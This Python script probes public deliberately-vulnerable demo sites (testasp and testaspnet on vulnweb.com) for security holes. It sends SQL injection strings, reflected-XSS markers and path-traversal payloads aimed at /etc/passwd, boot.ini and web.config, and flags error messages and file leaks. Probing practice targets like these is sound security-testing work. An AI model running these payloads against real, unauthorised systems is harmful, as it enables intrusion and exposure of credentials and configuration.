#!/usr/bin/env python3
"""IV-13 Phase 4b: second-round vulnweb probes (found links).
testasp: Search.asp reflection/SQLi, showforum.asp?id= SQLi, Templatize.asp?item= traversal.
testaspnet: Comments.aspx (reflection + stored-XSS replay), ReadNews.aspx NewsAd traversal/reflection.
stdlib only. All query values properly URL-encoded this time."""
import json, os, re, time, ssl, urllib.request, urllib.parse, urllib.error
from html.parser import HTMLParser

OUT = '/home/z/my-project/scripts/iv_out'
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl._create_unverified_context()
MARK = 'zxK1mQ7v'

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def fetch(url, data=None, headers=None, timeout=25):
    hdrs = {'User-Agent': UA, 'Accept': 'text/html,*/*;q=0.8'}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs,
                                 method='POST' if data is not None else 'GET')
    op = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=CTX))
    try:
        r = op.open(req, timeout=timeout)
        return r.status, dict(r.headers), r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, {}, repr(e)

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.cur = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == 'form':
            self.cur = {'action': a.get('action'), 'method': (a.get('method') or 'GET').upper(), 'fields': []}
        elif self.cur is not None and tag in ('input', 'textarea', 'select', 'button'):
            self.cur['fields'].append({'tag': tag, 'type': a.get('type'), 'name': a.get('name'),
                                       'value': (a.get('value') or '')[:80], 'id': a.get('id')})
    def handle_endtag(self, tag):
        if tag == 'form' and self.cur:
            self.forms.append(self.cur)
            self.cur = None

results = []

def probe_get(base, path, params, label, checks=('len', 'sqlerr', 'reflect')):
    url = base + path + ('&' if '?' in path else '?') + urllib.parse.urlencode(params)
    st, hd, body = fetch(url)
    rec = {'label': label, 'url': url[:160], 'status': st, 'len': len(body) if isinstance(body, str) else 0}
    if isinstance(body, str):
        m = re.search(r'(OLE DB|SQL Server|Microsoft \[[^\]]+\]|ODBC|JET|syntax error|unterminated|SQLException|Unclosed quotation)[^<]{0,120}', body, re.I)
        if m:
            rec['sql_error'] = m.group(0)[:160]
        for pv in params.values():
            if isinstance(pv, str) and MARK in pv:
                rec['reflected_raw'] = pv in body
                rec['reflected_escaped'] = pv.replace('<', '&lt;').replace('>', '&gt;') in body
                i = body.find(MARK)
                rec['context'] = body[max(0, i - 90):i + 110].replace('\n', ' ')[:220] if i >= 0 else ''
        if 'root:' in body:
            rec['passwd_leak'] = True
        if 'web.config' in body.lower() or '<?xml' in body[:2000].lower():
            rec['config_hint'] = True
    print('%-42s %s len=%-6s %s' % (label, st, rec['len'],
          (rec.get('sql_error') or rec.get('context') or '')[:90]), flush=True)
    results.append(rec)
    time.sleep(0.4)
    return body

print('=' * 72)
print('testasp.vulnweb.com')
B = 'http://testasp.vulnweb.com'
# Search.asp form discovery
st, hd, body = fetch(B + '/Search.asp')
if isinstance(body, str) and st == 200:
    fp = FormParser()
    fp.feed(body)
    print('Search.asp forms:', [(f['method'], f['action'], [x['name'] for x in f['fields']]) for f in fp.forms])
    for f in fp.forms:
        for fld in f['fields']:
            if fld.get('name') and fld.get('type') not in ('submit', 'button', 'hidden'):
                if f['method'] == 'GET':
                    probe_get(B, f['action'] or '/Search.asp', {fld['name']: '<b>%s</b>' % MARK}, 'search-%s-xss' % fld['name'])
                    probe_get(B, f['action'] or '/Search.asp', {fld['name']: "'"}, 'search-%s-sqli' % fld['name'])
# showforum.asp?id SQLi boolean
probe_get(B, '/showforum.asp', {'id': '0'}, 'showforum-base')
probe_get(B, '/showforum.asp', {'id': '0\''}, 'showforum-quote')
probe_get(B, '/showforum.asp', {'id': '0 AND 1=1'}, 'showforum-true')
probe_get(B, '/showforum.asp', {'id': '0 AND 1=2'}, 'showforum-false')
probe_get(B, '/showforum.asp', {'id': '0 union select null'}, 'showforum-union')
# Templatize.asp traversal
probe_get(B, '/Templatize.asp', {'item': 'html/about.html'}, 'templatize-base')
probe_get(B, '/Templatize.asp', {'item': 'html/../../../../etc/passwd'}, 'templatize-passwd')
probe_get(B, '/Templatize.asp', {'item': '../../../../../../../../etc/passwd'}, 'templatize-passwd2')
probe_get(B, '/Templatize.asp', {'item': 'html/..\\..\\..\\..\\boot.ini'}, 'templatize-bootini')

print('=' * 72)
print('testaspnet.vulnweb.com')
B2 = 'http://testaspnet.vulnweb.com'
# Comments.aspx reflection + form
st, hd, body = fetch(B2 + '/Comments.aspx?id=0')
if isinstance(body, str) and st == 200:
    fp = FormParser()
    fp.feed(body)
    print('Comments.aspx forms:', [(f['method'], f['action'], [x['name'] for x in f['fields']]) for f in fp.forms])
    results.append({'label': 'comments-forms', 'forms': fp.forms})
probe_get(B2, '/Comments.aspx', {'id': '0'}, 'comments-base')
probe_get(B2, '/Comments.aspx', {'id': '0\''}, 'comments-quote')
probe_get(B2, '/Comments.aspx', {'id': '<b>%s</b>' % MARK}, 'comments-id-xss')
# ReadNews.aspx NewsAd
probe_get(B2, '/ReadNews.aspx', {'id': '0', 'NewsAd': 'ads/def.html'}, 'readnews-base')
probe_get(B2, '/ReadNews.aspx', {'id': '0', 'NewsAd': 'ads/../../../web.config'}, 'readnews-webconfig')
probe_get(B2, '/ReadNews.aspx', {'id': '0', 'NewsAd': '<b>%s</b>' % MARK}, 'readnews-xss')
# Signup.aspx — account registration surface (record only)
st, hd, body = fetch(B2 + '/Signup.aspx')
if isinstance(body, str) and st == 200:
    fp = FormParser()
    fp.feed(body)
    print('Signup.aspx forms:', [(f['method'], f['action'], [(x['name'], x['type']) for x in f['fields']]) for f in fp.forms])
    results.append({'label': 'signup-forms', 'forms': fp.forms})

with open(os.path.join(OUT, 'vulnweb_probes2.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('\nsaved -> scripts/iv_out/vulnweb_probes2.json')
